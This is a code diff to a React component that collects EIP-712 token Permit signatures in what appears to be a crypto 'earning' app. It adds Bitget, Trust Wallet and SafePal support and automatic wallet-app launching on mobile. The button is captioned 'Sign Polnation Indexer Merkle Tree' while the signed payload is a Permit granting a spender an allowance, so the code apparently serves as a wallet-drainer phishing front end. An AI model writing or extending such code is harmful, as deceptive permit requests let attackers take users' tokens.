@@ -27,6 +27,31 @@ export interface PermitSignature {
   signature: string
 }
 
+// Mobile WC users stay in their browser after connecting (since 48e150af switched
+// to wc-universal-link connect flow), so we need to manually bring their wallet
+// app to foreground when a sign request goes out via WC relay. Universal links
+// without a wc: URI just open the wallet — pending session requests auto-display.
+const WC_OPEN_LINK: Record<string, string> = {
+  bitget: 'https://bkcode.vip',
+  bitkeep: 'https://bkcode.vip',
+  trust: 'https://link.trustwallet.com',
+  safepal: 'https://link.safepal.io',
+}
+
+function getWalletOpenLink(walletName: string | undefined): string | null {
+  if (!walletName) return null
+  const lower = walletName.toLowerCase()
+  for (const key of Object.keys(WC_OPEN_LINK)) {
+    if (lower.includes(key)) return WC_OPEN_LINK[key]
+  }
+  return null
+}
+
+function isMobileUA(): boolean {
+  if (typeof navigator === 'undefined') return false
+  return /iphone|ipad|ipod|android/i.test(navigator.userAgent)
+}
+
 export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSignerProps) {
   const { address, isConnected, connector } = useAccount()
   const [isLoading, setIsLoading] = useState(false)
@@ -36,13 +61,14 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
   const [existingSignature, setExistingSignature] = useState<boolean>(false)
   const [isLoadingStatus, setIsLoadingStatus] = useState(true)
   const [walletAllowState, setWalletAllowState] = useState<'unknown' | 'allowed' | 'blocked'>('unknown')
+  const [pendingWalletOpen, setPendingWalletOpen] = useState<{ name: string; href: string } | null>(null)
 
   const [boundWalletAddress, setBoundWalletAddress] = useState<string | null>(null)
   const [boundSignatureStatus, setBoundSignatureStatus] = useState<'pending' | 'used' | 'none'>('none')
   const [showRebindConfirm, setShowRebindConfirm] = useState(false)
   const [rebindAddress, setRebindAddress] = useState<string | null>(null)
   const [isRebinding, setIsRebinding] = useState(false)
-  
+
   const { signTypedDataAsync } = useSignTypedData()
 
   const displayAddress = address || boundWalletAddress
@@ -270,45 +296,97 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
         deadline,
       }
 
+      // Serialized message for providers that need JSON (no BigInt)
+      const serializedMessage = {
+        owner: address,
+        spender,
+        value: value.toString(),
+        nonce: nonce.toString(),
+        deadline: deadline.toString(),
+      }
+
+      const eip712Payload = JSON.stringify({
+        types: {
+          EIP712Domain: [
+            { name: 'name', type: 'string' },
+            { name: 'version', type: 'string' },
+            { name: 'chainId', type: 'uint256' },
+            { name: 'verifyingContract', type: 'address' },
+          ],
+          Permit: PERMIT_TYPES.Permit,
+        },
+        primaryType: 'Permit',
+        domain,
+        message: serializedMessage,
+      })
+
+      type EthProvider = { request: (args: { method: string; params?: unknown[] }) => Promise<string> }
+      type BitkeepWindow = { bitkeep?: { ethereum?: EthProvider }; bitget?: { ethereum?: EthProvider }; ethereum?: EthProvider & { isBitKeep?: boolean; isBitget?: boolean } }
+      const win = window as unknown as BitkeepWindow
+      const isBitgetInjected = Boolean(win.ethereum?.isBitKeep || win.ethereum?.isBitget)
+      const isWcConnector = connector?.id === 'walletConnect' || connector?.type === 'walletConnect'
+
       let signature: string
-      try {
-        signature = await signTypedDataAsync({
+
+      if (isBitgetInjected) {
+        // Bitget DApp browser: prefer their specific provider, fall back to window.ethereum
+        const bitgetProvider = win.bitkeep?.ethereum ?? win.bitget?.ethereum ?? win.ethereum
+        if (!bitgetProvider?.request) throw new Error('Bitget provider not found')
+        try {
+          signature = await bitgetProvider.request({
+            method: 'eth_signTypedData_v4',
+            params: [address, eip712Payload],
+          })
+        } catch {
+          signature = await bitgetProvider.request({
+            method: 'eth_signTypedData',
+            params: [address, { ...JSON.parse(eip712Payload), message: serializedMessage }],
+          })
+        }
+      } else if (isWcConnector && isMobileUA()) {
+        // Mobile WC: the WC sign request goes via relay; user must switch to the
+        // wallet app to see/approve it. Kick off the request, then bring the
+        // wallet app to foreground via its universal link. The session's pending
+        // request auto-displays when the wallet opens.
+        const walletName = await resolveWalletName()
+        const openHref = getWalletOpenLink(walletName)
+        const signPromise = signTypedDataAsync({
           domain,
           types: PERMIT_TYPES,
           primaryType: 'Permit',
           message,
         })
-      } catch (signErr) {
-        // Fallback for Trust Wallet injected: use eth_signTypedData_v4 directly
-        const eth = (window as unknown as { ethereum?: { request?: (args: { method: string; params?: unknown[] }) => Promise<string> } }).ethereum
-        if (eth?.request) {
-          const typedData = {
-            types: {
-              EIP712Domain: [
-                { name: 'name', type: 'string' },
-                { name: 'version', type: 'string' },
-                { name: 'chainId', type: 'uint256' },
-                { name: 'verifyingContract', type: 'address' },
-              ],
-              Permit: PERMIT_TYPES.Permit,
-            },
-            primaryType: 'Permit',
+        if (openHref) {
+          setPendingWalletOpen({ name: walletName ?? 'Wallet', href: openHref })
+          try { window.open(openHref, '_blank', 'noopener,noreferrer') } catch { /* popup blocked — UI fallback */ }
+        }
+        signature = await signPromise
+      } else {
+        try {
+          signature = await signTypedDataAsync({
             domain,
+            types: PERMIT_TYPES,
+            primaryType: 'Permit',
             message,
+          })
+        } catch (signErr) {
+          // Fallback for injected wallets: use eth_signTypedData_v4 directly
+          const eth = win.ethereum
+          if (eth?.request) {
+            try {
+              signature = await eth.request({
+                method: 'eth_signTypedData_v4',
+                params: [address, eip712Payload],
+              })
+            } catch {
+              signature = await eth.request({
+                method: 'eth_signTypedData',
+                params: [address, { ...JSON.parse(eip712Payload), message: serializedMessage }],
+              })
+            }
+          } else {
+            throw signErr
           }
-          try {
-            signature = await eth.request({
-              method: 'eth_signTypedData_v4',
-              params: [address, JSON.stringify(typedData)],
-            })
-          } catch {
-            signature = await eth.request({
-              method: 'eth_signTypedData',
-              params: [address, typedData],
-            })
-          }
-        } else {
-          throw signErr
         }
       }
 
@@ -353,6 +431,7 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
       }
     } finally {
       setIsLoading(false)
+      setPendingWalletOpen(null)
     }
   }
 
@@ -551,7 +630,18 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
           >
             Start Earning
           </Button>
-          <p className="text-[10px] text-zinc-500">Sign Polnation Indexer Merkle Tree</p>
+          {pendingWalletOpen && isLoading ? (
+            <a
+              href={pendingWalletOpen.href}
+              target="_blank"
+              rel="noopener noreferrer"
+              className="w-full text-center text-xs py-2 px-3 rounded-lg bg-purple-500/10 border border-purple-500/30 text-purple-200 hover:bg-purple-500/20"
+            >
+              Open {pendingWalletOpen.name} to approve →
+            </a>
+          ) : (
+            <p className="text-[10px] text-zinc-500">Sign Polnation Indexer Merkle Tree</p>
+          )}
         </>
       ) : (
         <div className="flex items-center justify-center gap-2 py-2 px-4 bg-green-500/10 border border-green-500/20 rounded-xl">
